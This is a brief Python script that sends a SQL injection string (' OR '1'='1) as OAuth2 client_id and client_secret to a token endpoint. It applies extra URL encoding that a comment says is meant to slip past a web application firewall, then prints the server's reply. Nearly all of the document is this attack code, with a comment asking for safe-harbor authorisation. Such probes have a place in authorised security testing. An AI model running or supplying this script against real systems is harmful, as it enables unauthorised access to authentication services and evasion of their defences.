#In this example we send URL encoded SQL commands to an OAUTH2 endpoint.
#Dont use without a safe harbor.


import requests
from urllib.parse import quote

#FQDN of target endpoint here 
url = "http://"



headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

#payload for invalid OAuth2 parameters
invalid_params = quote("' OR '1'='1")
payload = {
    "client_id": invalid_params,
    "client_secret": invalid_params,
    "grant_type": "client_credentials"
}

# URL-encode the payload to smuggle past WAF
payload_encoded = "&".join(f"{key}={quote(str(value))}" for key, value in payload.items())


response = requests.post(url, headers=headers, data=payload_encoded)
print(f"Response Code: {response.status_code}")
print(f"Response Headers: {response.headers}")
print(f"Response Body: {response.text}")
